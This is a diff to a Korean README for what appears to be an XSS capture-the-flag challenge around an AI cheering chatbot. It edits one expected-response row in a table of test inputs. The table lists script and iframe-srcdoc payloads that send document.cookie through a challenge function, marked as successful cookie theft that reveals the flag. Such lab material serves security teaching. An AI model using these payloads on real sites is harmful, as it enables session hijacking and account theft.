@@ -97,7 +97,7 @@
 ## ✅ 테스트 케이스 예시
 | 입력 | 기대 응답 |
 |-----|-----|
-| `오늘도 고생했어` | 🤖 긍정적인 응원 메시지 |
+| `오늘도 고생했어` | 🤖 AI 응원 메시지: 오늘도 열심히 한 당신, 정말 대단해요! 🌟💪 |
 | `<script>alert(1)</script>` | ❌ 아무 일도 일어나지 않음 (단순 alert) |
 | `<script>sendToServer(document.cookie)</script>` | ✅ 쿠키 탈취 성공 → 인증 시 flag 노출 |
 | `<iframe srcdoc="<script>sendToServer(document.cookie)</script>"></iframe>` | ✅ 쿠키 탈취 성공 → 인증 시 flag 노출 |
